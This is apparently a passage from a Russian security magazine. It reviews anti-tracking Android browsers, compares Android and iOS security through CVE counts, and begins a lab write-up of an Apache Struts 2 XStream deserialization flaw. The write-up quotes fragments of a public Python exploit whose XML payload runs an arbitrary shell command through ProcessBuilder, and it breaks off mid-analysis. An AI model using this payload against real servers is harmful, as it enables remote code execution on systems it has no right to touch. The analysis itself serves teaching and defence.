над лежащей им торговой марки OnePlus с тем же стандартом, но под наз‐
вани ем DASH Charge).
  И последнее. Если хочешь максимально продлить срок служ бы акку муля‐
тора, вос пользуйся приложением Battery Charge Limit (тре бует ся рут). Осо‐
бенно хорошо работает для устрой ств, которые про водят боль шую часть вре‐
мени на зарядке, — нап ример, при использовании телефона в качестве авто‐
мобильного навигатора.
X‐MOBILE





ТЕСТИРУЕМ МОБИЛЬНЫЕ БРАУЗЕРЫ
НА ANDROID С ЗАЩИТОЙ
ОТ ОТСЛЕЖИВАНИЯ                                   Денис Погребной




В Google Play и Apple App Store можно найти множество бра‐
узе ров со встро енным бло кировщиком рекламы и защитой
от отсле живания. Их разработ чики обещают нам приват‐
ность, молниенос ную ско рость  загрузки веб‐страниц  и,
конеч но  же,  рассказывают об  уникальных  технологиях,
заложенных в их продукт. Но выполняют ли бра узе ры свои
фун кции на самом деле и что, в конце кон цов, означает тер‐
мин «защита от отсле живания»?


Представь себе кар тину: май, ты приходишь в супер маркет и покупаешь граб‐
ли. Через неделю сно ва заходишь, и навстре чу выбегает орава продав‐
цов‐консультантов, наперебой предлагая купить различные виды граблей.
Наибо лее прод винутые из них пыта ются втю хать тебе тяпки, а некоторые
даже лопаты. И никакие твои объясне ния, что весь инвентарь у тебя остался
с прош лого сезона и на самом деле ты зашел купить газонокосил ку,
не работа ют.
  Ты кое‐как отби ваешься от консультан тов, прокладывая себе дорогу
с помощью лопаты, которую они таки сумели тебе всучить, и уходишь. Но по
пути домой замечаешь на заборе рекламный плакат, который сообщает, что
все владельцы граб лей, куп ленных на прошлой неделе в три часа дня,
и лопат, купленных сегод ня в 5:40, получают скид ку на оптовую партию семян
редиса, про дажей которо го занимается компания из соседнего города.
  Именно так работа ет таргетированная реклама и тре кинг пользовате лей
на веб‐сайтах. Ты заходишь на сайт, он присваивает тебе идентификатор
и начинает отслеживать твои дей ствия. Если эта система действует только
в рамках одно го веб‐сайта — ничего страш ного. Но существует мас са контор
(в основном, но не толь ко рек ламных сетей), которые могут проследить твои
переме щения по многим сайтам и сос тавить целую карту твоих сетевых
похож дений и интересов.
  Кроме конфиденциаль ности, так же стра дает и ско рость. Каждый тре‐
кинг‐скрипт, раз мещенный на сайте, замедляет заг рузку веб‐страницы, а ког‐
да их мно го — такое замед ление становит ся заметным даже невооруженным
глазом. Пару лет назад разработчики Mozilla протес тировали скорость заг‐
рузки сай тов с вклю ченным режимом защиты и без него и выясни ли, что
среднее вре мя заг рузки страницы в режиме защиты от трекинга сократилось
на 44%. На мобильных устройствах блокиров ка трекинга дает и дру гой плюс:
мень шее количес тво получа емых данных.


МЕТОДЫ ОТСЛЕЖИВАНИЯ (ТРЕКИНГА) ПОЛЬЗОВАТЕЛЕЙ
В этой статье мы рассмот рим, как бороться с трекин гом, но для начала раз‐
берем ся, как он работа ет. Трекинг — это отслеживание пользователя
с  помощью  различных  техник  идентификации  браузера.  Существует
как минимум пять тех ник: Cookie, Evercookie, ﬁngerprinting, IP, поведенческий
ана лиз.


Cookie
Са мый древ ний и самый интелли гентный способ отслеживания. Печеньки
как раз и были разработа ны для иден тифика ции пользовате ля. Принцип
работы  очень  прост:  пользователь  открывает  сайт,  тот  запрашивает
информацию из cookie, если информации нет, сайт реша ет, что пользователь
на сайте впер вые, генерирует уни каль ный иден тификатор и записы вает его (с
некоторой допол нительной информацией о пользователе) в cookie.
   Те перь (в теории) при следующих визитах сайт сможет рас познать поль‐
зователя по уни кальному идентифика тору, который был записан в cookie‐
файлы на его компьютере. Понятное дело, что пос ле очис тки всех cookie‐
файлов юзер ста новится анонимным абсолютно для всех сайтов. Однако,
кроме HTTP Cookie, так же существуют Flash Cookie и Silverlight Cookie. И очи‐
щать их нужно отдельно.


Evercookie
Данный вид тре кинга можно смело именовать «проектом деанонимизации
интернета». Он сохраняет идентификатор пользователя везде, где это воз‐
можно. Используют ся как стандартные хранилища: HTTP, Flash,  Silverlight
Cookie, так и различные трюки вроде PNG Cookies (сервер отдает браузе ру
индивидуальную кар тинку с записан ным в нее идентификатором, она попада‐
ет в кеш браузера, и при пос леду ющем визите пользователя сайт встав ляет
картинку в canvas и считывает записанную в нее информацию), а также хра‐
нилища HTML5 (Session Storage, Local Storage, Global Storage, Database Stor‐
age через SQLite и так далее), журнал посещен ных веб‐страниц (только
для старых браузеров), ETag header, java persistence API. Все, что возможно
использовать, используется.
   Удалить Evercookie очень слож но. Однако есть у него один недостаток —
так же как и в случае с кукисами, данные сохраняются на жесткий диск (или
в NAND‐память телефо на). А это зна чит, что обыч ный режим инкогни то неуяз‐
вим перед Evercookie.


Отпечаток браузе ра
В этом случае поль зователя рас познают, считывая данные о бра узере, его
нас тройках и устройстве, с которого юзер заходит на сайт. Много ли этих
данных? Да, очень много. Самые простые: user agent (название, версия
и разрядность браузера и ОС, тип устройства, на котором установлен бра‐
узер, под держиваемые бра узером фун кции и прочее), язык бра узера,
часовой пояс, разрешение экрана, глубина цвета, поддержка технологий
HTML5 (при вет, любители копаться в скрытых настрой ках бра узе ра), наличие
doNotTrack, cpuClass, platform, установ ленные пла гины и информация о них,
шриф ты, дос тупные в системе.
   Также исполь зуют ся и различные хитрые техники: Canvas Fingerprint, We‐
bGL Fingerprint, WebRTC Fingerprinting. По утверждению соз дателей скриптов,
вероятность распозна вания уже сейчас превышает 90%. А в некоторых слу‐
чаях составляет 99,(9)% (не так уж и много людей любят ставить Canary‐вер‐
сию Google Chrome и копаться в настрой ках chrome://ﬂags для акти вации
новых фишек HTML5). Недос таток технологии: на практике распознавание
не может быть стопроцентным, потому что основано на статистических дан‐
ных и вероятность ошиб ки будет всег да.


Отсле живание по IP
Ис поль зуя твой IP‐адрес, мож но узнать местоположение (час то с ошибкой)
и имя провай дера. Однако из‐за пери оди чес кой сме ны IP как в про водных,
так и в беспроводных сетях этот метод край не ненадеж ный и на прак тике
используется толь ко для приб лизительного определе ния мес тополо жения.


По веден ческий анализ
Идентификация на основе индивидуальных особенностей поведения и вкусов
поль зовате ля: скорости дви жения мыши, любимых фильтров поиска, пред‐
почита емых товаров, скорости просмотра картинок, частоты кли ков и так
далее. Недос татки оче видны: для отслеживания действий нужно исполь‐
зовать тяжело весные скрип ты, которые будут не только наг ружать канал, но и
тормозить  компьюте ры.  Точность  рас позна вания  слишком  пла вающая
и слиш ком сильно зависит от различных факторов.


КАК БРАУЗЕРЫ БОРЮТСЯ С ОТСЛЕЖИВАНИЕМ
Как видишь, есть толь ко два надежных метода иден тифици ровать поль‐
зователя: Cookie и Evercookie. Что бы защититься от них, достаточно ходить
на все сайты в режиме инкогнито, который есть практичес ки в любом сов‐
ременном бра узе ре. Но тогда ты столкнешься с дру гой проблемой: кроме
отсле жива ния, печеньки при меняются и для многих других полез ных задач.
Нап ример, для хранения токена авто ризации, который позволяет не вводить
свои логин и пароль при каждом вхо де на сайт. На трафике и скорос ти заг‐
рузки страниц с помощью инкогнито тоже сэконо мить не получится.
  Браузе ры с защитой от отслежива ния работа ют по‐другому: они исполь‐
зуют черные списки тре кинг‐скрип тов (вро де таких) и просто блокируют их
исполне ние.
  В большинстве браузеров для аноним ного серфинга (Firefox Focus, Yo
Browser, InBrowser, Ghostery, Cliqz и в некото рых обычных браузе рах) также
есть возможность автоматической очис тки при ватных данных при выходе.
Для смар тфона такой очистки вполне хватит, чтобы спра виться с Evercookie.
  С отпе чат ком браузера дела обстоят сложнее, потому что большинство
све дений браузер переда ет не от желания рас сказать о себе побольше,
а для  того, чтобы веб‐страница отображалась правильно. Как вари ант
защиты — браузер может отправлять све дения о себе, которые будут похожи
на максимальное количество других браузе ров.




Для теста браузе ра был исполь зован смартфон Samsung Galaxy S7 и сле‐
дующие страницы:
 • https://xakep.ru
 • https://xakep.ru/2017/08/15/mobile‐mesh/
 • https://www.svyaznoy.ru/
 • http://www.theworldsworstwebsiteever.com/
 • http://www.samsung.com/ru/




BRAVE
«Brave выполняет мис сию по исправлению сети, пре доставляя поль зовате‐
лям более безопасный, быстрый и удоб ный опыт исполь зования с помощью
новой привлекательной экосистемы воз награждения. Brave — это больше
чем браузер, это новый спо соб мыш ления о том, как работает интернет».
  После таких громких выс казываний ждешь чего‐то особенного, однако
спус тя пару минут пос ле уста новки браузе ра понима ешь, что тут не так. Бра‐
узер представ ляет собой Chromium с функциями бло киров ки рекламы и пре‐
дотвращения отслеживания с возможностью вклю чать/отключать блокировку
для отдельно взятого сайта.
  Основное отличие от Chrome — нет новос тей на главной странице
и режима экономии трафика.
 • Страница в Google Play
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 108 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 130 Мбайт
 • Потребле ние ОЗУ (откры то пять тестовых сай тов): 372 Мбайт
 • Количество заб локированных трекеров (для пяти тестовых сайтов): 29





       Глав ная страница браузе ра и нас трой ка блокировки тре керов


IRON BROWSER
Браузер, разрабатываемый немецкой ком пани ей SRWare на основе исходно‐
го кода проекта Chromium. Появился он в противовес браузе ру Google
Chrome, который отсле живает дей ствия пользовате ля. По завере нию соз‐
дателей, SRWare Iron не делает ничего подобного. Так же Iron использует пос‐
ледние вер сии WebKit и V8, в то время как Google Chrome базируется на ста‐
бильных версиях.
  Похож на Chrome как две кап ли воды. В отличие от Brave, осталась
интеграция с Google, экономия тра фика и лента новостей (рекомендуемые
статьи) на главном экране. Производителем заяв лена защита от отслежива‐
ния, только вот настроить ее нельзя.
 • Страница в Google Play
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 98,71 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 152 Мбайт
 • Потребле ние ОЗУ (откры то пять тестовых сай тов): 440 Мбайт
 • Количество заб локированных трекеров (для пяти тестовых сайтов): неиз‐
   вес тно





                        Ну чем не Chrome?


FIREFOX FOCUS
Это очень прос той браузер без лиш них функций. О приватности браузера
напоминает кно поч ка корзины, которая отоб ража ется на любой странице
при прок рутке вверх. После нажатия на кноп ку корзины вся история браузе ра
и сох раненные данные очи щаются. Также кнопка очи щения истории есть
в штор ке с уве дом лени ями.
  Браузер уме ет бло кировать трекеры рекламы и аналитики, социальные
трекеры и другие. Есть режим «Невидимка» — функция блокировки скрин‐
шотов, которая зак рыва ет доступ к содержимому окна браузера. Из‐за этого
даже ани мация выключения экрана не работает. Зато невозможно перех‐
ватить содержимое, отоб ражаемое на дисплее.
  В отли чие от конкурен тов, Firefox Focus не скры вает свои черные списки,
через которые он блокирует трекеры. Под робная информа ция.
 • Страница в Google Play
 • Дви жок: Blink (на просторах интернета есть версия на движ ке Gecko)
 • Потребле ние ПЗУ (без учета данных приложения): 6,96 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 44,1 Мбайт
 • Потребле ние ОЗУ (открыт один тестовый сайт): 65 Мбайт (поддер жка
   вкладок отсутствует, была открыта на ша статья про мобильный mesh)
 • Количество заб локированных трекеров (для пяти тестовых сайтов): 43





                 Минимализм во всей красе


YO BROWSER
В описании на Play Market голимая реклама и ничего конкрет ного, а офи‐
циальный сайт находится в разработке. Впол не можно было прой ти мимо,
но заяв ление «Yo Browser обеспечивает не только легкое пользование
интернетом, но и вашу конфиденциальность и безопасность» таки заставило
нас вклю чить этот браузер в тест.
  В бра узере есть интересная функция быстрого откры тия режима инкогни‐
то: после нажатия ссылки всплы вает предложение выб рать, в каком режиме
ее открыть, обычном или инкогнито. При выходе предлагает почистить кеш,
cookie, историю. Мож но вклю чить авто очистку при выходе.
   Есть ноч ной режим, благодаря которому фон и некоторые элементы боль‐
шинства сай тов окра шиваются в черный цвет, а также встроенный ска нер QR‐
кодов. Мож но заб локировать отображение изображений и рекламы. Также
есть воз можность отклю чить JavaScript и Cookies.
 • Страница в Google Play
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 18,99 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 117 Мбайт
 • Потребле ние ОЗУ (откры то пять тестовых сай тов) 250 Мбайт
 • Количество заб локированных трекеров (для пяти тестовых сайтов): в бра‐
   узе ре нет инди като ра





                          Главная страница


INBROWSER
«InBrowser — это инкогнито‐браузер. Каж дый раз, когда вы выходите из In‐
Browser, все, что вы сде лали в приложении, будет стерто, включая историю,
файлы cookie и сеансы». То есть разработчики как бы говорят: это не столь ко
отдельный браузер, сколько режим инкогнито, выделенный в отдельное при‐
ложение. Прямой конкурент Firefox Focus.
  В целом бра узер производит странное впечатление, однако по функци‐
ональности он лучший среди компак тных бра узеров с защитой от отслежива‐
ния. Он уме ет интегрироваться с Orbot (для создания соеди нения с интерне‐
том через сеть Tor без VPN), менять user agent (на выбор дос тупны Chrome,
Firefox, Internet Explorer, Safari).
  Из допол нительной функциональности:
 • «переформатирование тек ста» — перес тройка десктопной вер сии сайта
   под мобильные экраны, работа ет она не всегда корректно, но свою фун‐
  кцию выполняет;
 • от клю чение загрузки изображений;
 • запрет исполне ния JavaScript и плагинов, если таковые уста новлены в сис‐
   теме.

Кста ти, в браузере име ется осо бый «безопасный режим» — блокировка
скриншотов и защита от отображения в спис ке последних при ложе ний стан‐
дартными средствами Android.
 • Страница в Google Play
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 6,51 Мбайт
 • Потребле ние ОЗУ: зафик сировать не уда лось, так как приложе ние авто‐
   мати чески выг ружается из памяти
 • Количество заб локированных трекеров (для пяти тестовых сайтов): в бра‐
   узе ре нет инди като ра





     Ори гинальный дизайн главной страницы и переключения вкладок


GHOSTERY
«Ghostery выяв ляет и блокиру ет системы слежения в Сети, защищая ваши
данные,  уско ряя  загрузку  страниц  и  уби рая  отвлекающие  эле менты».
В общем, обычный браузер с блокиров кой рек ламы и трекеров. По сло вам
раз работ чиков, блокировка очень продвинутая, но чем она прод винута —
никто не поясняет.
   Так же как и многие другие бра узе ры, уме ет очищать все приватные дан‐
ные при выходе. Для акти вации функции нужно перейти в «Настрой ки → Очи‐
щать при выходе» и поставить все галоч ки. Загрузка вкладок в фоне глючит:
если, не дож давшись загрузки страницы, открыть новую вкладку, а в ней
открыть новый адрес, то заг рузка первоначаль ной страницы оста новится.
 • Страница в Google Play
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 6,07 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 185 Мбайт
 • Потребле ние ОЗУ (откры то пять тестовых сай тов): 317 Мбайт
 • Количество заб локированных трекеров (для пяти тестовых сайтов): 16





      Может, и некрасиво, зато шесть мегабайт памяти занимает


CLIQZ
Еще один впол не стандартный бра узер с защитой от отсле живания на движ ке
Chromium. Отли чается толь ко тем, что сам собирает статистику исполь‐
зования для «улуч шения релевантности результатов поиска и обеспечения
работы самых продвинутых функций защиты приватности».
  Поддержи вает синхро низацию с десктопным браузе ром  Cliqz, име ет
встро енный сканер QR‐кодов. Также в нас трой ках мож но вклю чить автомати‐
ческую очистку кеша, истории, cookie и других личных данных после зак рытия
при ложе ния (Settings → Privacy → галочки вни зу спис ка).
 • Страница в Google Play
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 34,81 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 198 Мбайт
 • Потребле ние ОЗУ (откры то пять тестовых сай тов): 327 Мбайт
 • Количество заб локированных трекеров (для пяти тестовых сайтов): 12





      И не подума ешь, что браузер занима ет аж 35 Мбайт памяти


ЯНДЕКС.БРАУЗЕР С РАСШИРЕНИЕМ DISCONNECT
Браузер «Яндекс» не уме ет блокировать тре керы самостоятель но, зато имеет
под держку расширений, благодаря которой в него можно добавить рас‐
ширение Disconnect. Рассказывать тут осо бо не о чем: и браузер, и Discon‐
nect — извес тные про дукты, о которых написано мно жество обзо ров.
 • Страница для загрузки и Disconnect
 • Дви жок: Blink
 • Потребле ние ПЗУ (без учета данных приложения): 80,61 Мбайт
 • Потребле ние ОЗУ (откры та только домашняя страница): 288 Мбайт
 • Потребле ние ОЗУ (откры то пять тестовых сай тов): 540 Мбайт
 • Количество заб локированных трекеров (для пяти тестовых сайтов): 25





       Самый блатной дизайн среди всех, не зря 80 Мбайт куша ет


ПРО СКОРОСТЬ РАБОТЫ
На Galaxy S7 все рассмотренные бра узеры работа ют нас только быстро, что
отли чия в ско рос ти работы обнаружить нево оружен ным взглядом очень слож‐
но (если они вообще есть...). Проб лем с отображением веб‐страниц так же
замече но не было.


ВЫВОДЫ: ЧТО ВЫБРАТЬ?
Какой же браузер выб рать? Все зависит от пред почтений, но мы рекомен‐
дуем остановиться либо на Firefox Focus, либо на бра узе ре «Яндекс» + Dis‐
connect. Пер вый не под держивает вкладки и по большому счету вооб ще
не похож на пол ноценный браузер, зато его дела ет контора, которой можно
доверять. Второй — это дей ствительно неплохой бра узер. Расширение Dis‐
connect также хорошо известно и зас луживает доверия.
X‐MOBILE





     КОЛОНКА ЕВГЕНИЯ ЗОБНИНА





                                                     zobnin@glc.ru





Стран ный заголо вок, не прав да ли? Автор, должно быть, рех‐
нулся, если решил срав нить безопас ность iOS, которую
не может взломать даже ФБР, и дырявое вед ро под названи‐
ем Android. Но я серьезен: Android и iOS можно и даже нуж но
срав нивать. Не затем, что бы в оче ред ной раз доказать, что
iOS намного луч ше. А потому, что iOS про игрывает.


Несколь ко месяцев назад Олег Афо нин из «Элкомсофта» написал большую
статью о том, насколько хорошо защище ны смартфо ны на разных мобильных
плат формах. Осо бенно эпичной получи лась зак лючительная часть про An‐
droid, где он разнес систему в пух и прах и назвал самой дырявой из всей
боль шой тройки (iOS, Windows Phone/Mobile, Android).
  Мы долго дис кутировали на эту тему и в конце кон цов сош лись во мне нии,
что сто ит добавить в статью мою врезку, с альтер нативным взгля дом на проб‐
лему. В двух сло вах суть врезки: Олег, как специалист по мобиль ной кри‐
миналистике, лучше других зна ет, что взломать среднеста тистический смар‐
тфон на Android гораз до про ще, чем iPhone. Я же попытался сказать, что
проблема в большей степени не в самом Android, а в устройствах, на нем
работа ющих. И многое зависит от того, какой конкретно смартфон ты исполь‐
зуешь.
   Как и Олег, я убежден, что iPhone гораздо безопаснее смартфонов на An‐
droid. Это оче видный факт, который про истекает из того, что Apple полностью
контро лирует эко сис тему своих устрой ств: свое железо, свой единствен ный
App Store, быстрые апдейты напрямую от разработ чиков iOS, в ОС никто
не вно сит правок, кро ме самой Apple. Ком пания не только развивает iOS,
но и управляет всем вокруг нее, вклю чая сами устройства.
  Однако  если  пос мотреть немножко под  другим  углом и  сравнить
не устройства, не экосис тему, не весь этот пласт сер висов и технологий, соз‐
данных вокруг iOS и Android, — если отбросить все это и сравнить Android
и iOS как отдельно взятые ОС, то картина ста новится далеко не такой
однознач ной.
  Для начала небольшая табличка:
 • iPhone OS 1.0 — взло мана спустя 11 дней;
 • iPhone OS 2.0 — взло мана спустя 35 дней;
 • iPhone OS 3.0 — взло мана спустя 2 дня;
 • iOS 4.0 — взло мана спустя 2 дня;
 • iOS 5.0 — взло мана спустя 1 день;
 • iOS 6.0 — взло мана в тот же день;
 • iOS 7.0 — взломана спус тя 95 дней;
 • iOS 7.1 — взломана спус тя 25 дней;
 • iOS 8.0 — взло мана спустя 35 дней;
 • iOS 8.1.1 — взломана спус тя 12 дней;
 • iOS 9.0 — взло мана спустя 28 дней;
 • iOS 9.1 — взло мана спустя 142 дня;
 • iOS 10 — взло мана спустя 106 дней.

Она показы вает, сколь ко дней прош ло между релизом новой версии iOS
и первым джейлбрей ком. В контек сте обсужде ния безопас ности это очень
важ ная таблица, потому что технически джей лбрейк — это не что иное,
как получе ние прав root. А пра ва root, в свою оче редь, дают полный контроль
над устройством, и получить их можно только одним путем — обойдя защит‐
ные механизмы ОС.
  Ты можешь сказать, что Android тоже рутят все кому не лень, и будешь
прав. Однако здесь есть множество нюансов, включая такие факторы,
как частая воз можность получить root «легально» (разблокировав загрузчик),
существование огромного  количества  устройств на про цессорах MTK,
в которых заг рузчик в принципе не заб локирован, а также дыры, которые
не отно сятся нап рямую к Android и появились благода ря кри вору кости ком‐
пании‐про изводите ля.
  В общем, сход ную таб лицу для Android составить практически невоз‐
можно, но мы можем сравнить iOS и Android, используя немного дру гие дан‐
ные. Взгляни:
 1. Android — 1308 уязвимос тей.
 2. iOS — 1275 уязвимостей.

Это количество всех ког да‐либо найден ных уяз вимостей в iOS и Android
по данным cvedetails.com. Android занимает первое мес то, iOS немного
отста ет. Уже толь ко этой информации дос таточно, чтобы раз веять миф о том,
что Android — решето решетом, а iOS — неп риступная кре пость. Но мы пой‐
дем немного дальше и взглянем на сами уязвимос ти.
  На момент написа ния статьи последние три уязвимос ти Android были
такими:
 1. The lockscreen on Elephone P9000 devices (running Android 6.0) allows physi‐
    cally proximate attackers to bypass a wrong‐PIN lockout feature by pressing
   backspace after each PIN guess.
 2. In all Qualcomm products with Android releases from CAF using the Linux ker‐
    nel, a race condition in a WLAN driver can lead to a Use After Free condition.
 3. In all Qualcomm products with Android releases from CAF using the Linux ker‐
    nel, a race condition in a USB driver can lead to a Use After Free condition.

Один баг в реализации экрана бло кировки в дешевом китай ском кус ке плас‐
тика под названи ем Elephone P9000 и две уяз вимости в фирменных драй‐
верах Qualcomm, автор которых — сама Qualcomm и которые имеют такое же
отношение к Android, какое драй вер для видеокарты Nvidia имеет к Windows.
   Ок, впол не возможно, это слу чайность и прос то сте чение обстоятельств.
Сделаем выборку из 100 пос ледних уяз вимос тей:
 • 29 — драйверы Qualcomm;
 • 28 — уязвимости Android;
 • 20 — ядро CAF, развиваемое Qualcomm;
 • 9 — драй веры Mediatek;
 • 7 — драй веры Broadcom;
 • 4 — уяз вимос ти в про шивках произво дителей;
 • 3 — драй веры Nvidia.

Итого: почти полови на уязвимос тей найдена в драйверах (и фирменном
ядре) Qualcomm, мень ше трети — в коде самого Android. Та же выборка
для iOS:
 • 99 — уязвимости iOS;
 • 1 — драй вер Qualcomm.

Ты, конеч но же, можешь возразить, что мой ана лиз слишком примитивен, я
взял весь срез уязвимостей, включив в него DoS, уязвимости с низким рей‐
тингом и тому подобное. Но давай пос мотрим прав де в глаза. Я при вел ста‐
тистику на основе 100 уязвимос тей, это 8% из всех зарегис трированных
за все вре мя сущес твования ОС багов. Если это нерепрезентативная выбор‐
ка, то я не знаю, какая будет репрезен тативной.
  А теперь взглянем на самые известные и страшные баги, о которых не так
давно трубили на каждом углу. Вот неполный спи сок для iOS:
 • CVE‐2009‐2204 (до 3.0.1) — просмотр вре доносного сообщения SMS
  может при вести к неожи данному сбою устройства или выпол нению про‐
   изволь ного кода;
 • CVE‐2010‐3832 (до 4.2) — уда ленное исполнение кода в процес соре
  GSM‐модема;
 • CVE‐2012‐0672 (до 5.1.1) — уда ленное исполне ние кода с помощью спе‐
   циаль ным образом сформированной web‐стра ницы;
 • CVE‐2016‐4631 (до 9.3.3) — удален ное исполнение кода с помощью
   показа изображения в формате TIFF на веб‐странице, в пись ме, сооб‐
  щении и подобном;
 • Trident (до 9.3.5) — пользователь кликает по ссылке, после чего троян
   делает джейлбрейк и размещается в системе;
 • Broadpwn (до 10.3.3) — удаленное исполне ние кода через отправку осо‐
  бым образом сформированных Wi‐Fi‐фреймов (этот же баг присутс тву ет
   в смар тфо нах на Android).

Для Android можно привести такой же спи сок, и более чем наполо вину он
будет сос тоять из найденных в 2015–2016 годах багов Stagefright. Раз ница
только в том, что о багах iOS быстро забывают, они просто перестают быть
актуальными из‐за обновления всех устройств до новой вер сии ОС. А вот
о багах Android помнят долго, ведь уязвимос ти даже двух‐ и трехлетней дав‐
ности остаются акту альными для миллионов устройств.
   Если говорить об уяз вимостях, iOS определен но не самая защищенная
ОС, а Android не самая дырявая. А вот среднестатис тический смартфон
на Android — это решето. Все эти модификации, добавленные производите‐
лем, баги в фир менных загрузчиках, вечные проблемы с обновле ниями — все
это сводит на нет старания Google сделать Android безопас нее.
  Поэто му, если ты выбираешь смартфон на Android, следуй нескольким
советам.
 • Луч ший выбор — это Nexus, Pixel и смар тфоны Android One. Они работают
   под управле нием «чис того» Android и получа ют оперативные обновления
   в течение трех лет (два года обычных обновлений и один год обновлений
   безопасности).
 • Если  лучший выбор  невозможен,  пос мотри  в  сто рону смартфона,
   для которо го есть официальная под дер жка LineageOS, в первую оче‐
   редь это Samsung и OnePlus. Если производитель перес танет обновлять
   устройство, у тебя всег да будет возможность перей ти на LineageOS и про‐
   дол жать получать обновления.
 • Не надей ся, что твой китайский смар тфон на процес соре MTK будет слож‐
   но взломать. Человек с самой начальной под готовкой сольет с него дан‐
  ные на счет раз.

Ес ли же твой выбор — iPhone, то у тебя вообще никаких проблем. Сколько бы
багов ни было найдено в iOS, Apple закроет их в течение двух недель.
ВЗЛОМ


РАЗБИРАЕМ СВЕЖУЮ
УЯЗВИМОСТЬ В ФРЕЙМВОРКЕ
APACHE STRUTS 2





      aLLy
      ONsec
    @iamsecurity





Сегодня мы  вернемся  к  Apache  Struts,  популярному
веб‐фреймворку, который за последнее время натерпелся
от исследователей безопас ности и явил миру несколько
критических уязвимос тей. В этой статье я хочу обсу дить уяз‐
вимость в модуле, отвечающем за REST API. Она при водит
к выполнению про изволь ного кода и открывает широкие
возможности (такие, например, как слив личных данных
половины населения США).


В пре дыду щих сериях
Не так дав но я уже писал статью об уязвимос ти в Struts. Там речь шла
о некоррек тной обработ ке сообщений об ошибках: используя Object Graph
Navigation Language (OGNL), можно было выполнять произвольные команды
на машине.
  Еще была уязвимость языка шаб лонов Freemarker (Freemarker Template
Language). Некор рек тная работа механиз ма обработ ки тегов поз воляла
опять же отправ лять серверу выраже ния OGNL, которые снова при води ли
к выполнению произвольного кода.
  В этот раз под прицелом ока зался механизм REST API, а ошибка зак‐
ралась в механизм десериали зации сущностей XML.


Наш подопытный
Все свои манипуляции я буду произво дить на ОС Windows 10. В качес тве сер‐
вера я использую Apache Tomcat 8.5.20. Вер сию фреймвор ка Apache Struts я
возьму из вет ки 2.5, и это последняя уяз вимая до пат ча — 2.5.12. Скачать
можно, разуме ется, на офи циальном сайте. Что бы не пришлось искать, вот
тебе прямая ссы лочка (ZIP). Так же можешь ска чать только ис ходники, если
захочешь заг лянуть внутрь и лучше понять, как все устроено.
  После установки сервера нуж но распаковать архив с фреймворком, взять
из папки apps приложение struts2‐rest (файл struts2‐rest‐showcase.
war) и положить в пап ку webapps сервера Tomcat. Пос ле этого можно запус‐
кать сервер.
   Те перь,  перей дя по  адресу  http://127.0.0.1:8080/struts2‐rest‐
showcase, ты можешь наб людать нашего подопыт ного.





                Го товое к экспериментам приложение


Ко паемся в исходниках
Для начала несколько слов о ContentTypeHandler. Это интерфейс, который
пре дос тавляется фреймворком для конвертирова ния данных в объекты Java.
Десери ализацию здесь используют, что бы пре обра зовать переданные дан‐
ные в объекты. Поэто му каждый класс, реализующий этот интерфейс, пред‐
став ляет потенциаль ный интерес для нас как исследователей. Ведь все мы
любим десериали зацию юзердаты.
   Так вот, в Struts име ется такой класс, как XStreamHandler.


/plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStream
Handler.java
30: /**
31:  * Handles XML content
32:  */
33: public class XStreamHandler implements ContentTypeHandler {

Он исполь зуется при обработке данных в формате XML, отправленных
на сервер.
   Заглянем в конфигурацион ный файл.


/plugins/rest/src/main/resources/struts-plugin.xml
35:     <bean type="org.apache.struts2.rest.handler.ContentTypeHand
ler" name="xml" class="org.apache.struts2.rest.handler.XStrea
mHandler" />
...
47:     <constant name="struts.action.extension" value="xhtml,,xml,
json" />

Как видишь, обработка XML‐запросов вклю чена по умол чанию, и занимается
этим именно класс XStreamHandler.
  Во вре мя обра бот ки пользовательского запроса класс ContentTypeIn‐
terceptor опре деляет MIME‐тип отправленных данных и направляет выпол‐
нение кода в нужное русло — для обработки данных выбирается соответству‐
ющий обработ чик.


/plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeIn-
terceptor.java
38: public class ContentTypeInterceptor extends AbstractInterceptor {
...
48:     public String intercept(ActionInvocation invocation) throws
Exception {
49:         HttpServletRequest request = ServletActionContext.getReq
uest();
50:         ContentTypeHandler handler = selector.getHandlerForRe
quest(request);

Что бы превратить передан ные данные в объект, существует метод с под‐
ходящим названием toObject. Он и вызывается из обра ботчика, определен‐
ного с помощью intercept.


/plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeIn-
terceptor.java
59: InputStreamReader reader = new InputStreamReader(is);
60: handler.toObject(reader, target);


/plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStream
Handler.java
43: public void toObject(Reader in, Object target) {
44:     XStream xstream = createXStream();
45:     xstream.fromXML(in, target);
46: }

Объект in — это не что иное, как пользовательские данные, отправленные
определен ному методу REST API. Эти дан ные переда ются в XStream.from‐
XML.


/src/java/com/thoughtworks/xstream/XStream.java
1239: public <T> T fromXML(final Reader xml, final T root) {
1240:     return unmarshal(hierarchicalStreamDriver.createReader(xml)
, root);
1241: }

Оттуда они попадают в функцию десериализации unmarshal. Никаких пред‐
варительных про верок переданных данных не производится, поэто му можно
спо койно отправ лять что душе угод но, а душе угодно хле ба и зре лищ. Ну
и запущенный калькулятор, нап ример, увидеть было бы неплохо.


Де тали экспло ита и PoC
Так как для эксплуатации уяз вимости достаточно отправки обычного HTTP‐
запроса к серверу, то можно вос пользовать ся хоть curl. Но, разуме ется, есть
и готовый экс пло ит, написанный на Python.


42627.py
23: exploit = '''
24:         <map>
...
86:     request = requests.post(url, data=exploit, headers=headers)
...
94:     print ('[*] Example: python struts2.py http://sitevulnerable.
com/struts2‐rest‐showcase/orders/3 id')

Эксплоит использует готовый RCE‐пейлоад, нацелен ный на сис темы с Linux.


42627.py
38: <next class="java.lang.ProcessBuilder">
39: <command>
40: <string>/bin/sh</string><string>‐c</string><string>'''+ command
+'''</string>
41: </command>

Я прос то скопирую сам пейлоад, изменю его под наши Windows‐реалии,
